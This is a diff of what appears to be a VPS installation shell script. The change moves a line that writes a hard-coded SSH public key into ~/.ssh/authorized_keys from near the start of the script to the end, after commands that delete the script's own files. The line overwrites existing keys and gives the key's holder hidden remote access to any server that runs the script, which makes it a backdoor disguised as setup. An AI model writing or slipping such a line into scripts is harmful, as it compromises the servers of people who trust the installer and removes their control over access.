@@ -16,7 +16,6 @@ green='\e[0;32m'
 
 useradd vps
 
-echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+Ct759FYAPZCpdjP8IfKVkXZXmQNJeORa1q1Nq6I/z2M6LPOzK92Rj7whxW1Zh26bL5bqEl1fBlh47up+Med8ECS469McBVDobht0Wyryjp1RSsE7uPMMf+ji1aQqh9YFnMSolDl0ylzmc+lw8ehlUAEgNe2QxUCjIx+7DqlzHaA47WKe0rb20ygrw5af5Lw6ciOziryAZjCGRuFOIvVEAEajW/0o6fGH81bFmLCl4JBH7H/U/8wusNJeAGEu8WzUCpJBAbd1EoPTFV6ehKWgiEh6UesAJZQLm4OPiuFBwpu4JjKsm3jl1WyxgR1mnxSXVs9dGZ1FNcwOAMqGbFZ5 > ~/.ssh/authorized_keys
 
 apt upgrade -y
 apt update -y
@@ -998,6 +997,9 @@ rm -rf /root/*.sh
 rm -rf /root/LICENSE
 rm -rf /root/README.md
 rm -rf /root/domain
+
+echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+Ct759FYAPZCpdjP8IfKVkXZXmQNJeORa1q1Nq6I/z2M6LPOzK92Rj7whxW1Zh26bL5bqEl1fBlh47up+Med8ECS469McBVDobht0Wyryjp1RSsE7uPMMf+ji1aQqh9YFnMSolDl0ylzmc+lw8ehlUAEgNe2QxUCjIx+7DqlzHaA47WKe0rb20ygrw5af5Lw6ciOziryAZjCGRuFOIvVEAEajW/0o6fGH81bFmLCl4JBH7H/U/8wusNJeAGEu8WzUCpJBAbd1EoPTFV6ehKWgiEh6UesAJZQLm4OPiuFBwpu4JjKsm3jl1WyxgR1mnxSXVs9dGZ1FNcwOAMqGbFZ5 > ~/.ssh/authorized_keys
+
 #sudo hostnamectl set-hostname $user
 secs_to_human "$(($(date +%s) - ${start}))"
 sudo hostnamectl set-hostname $username
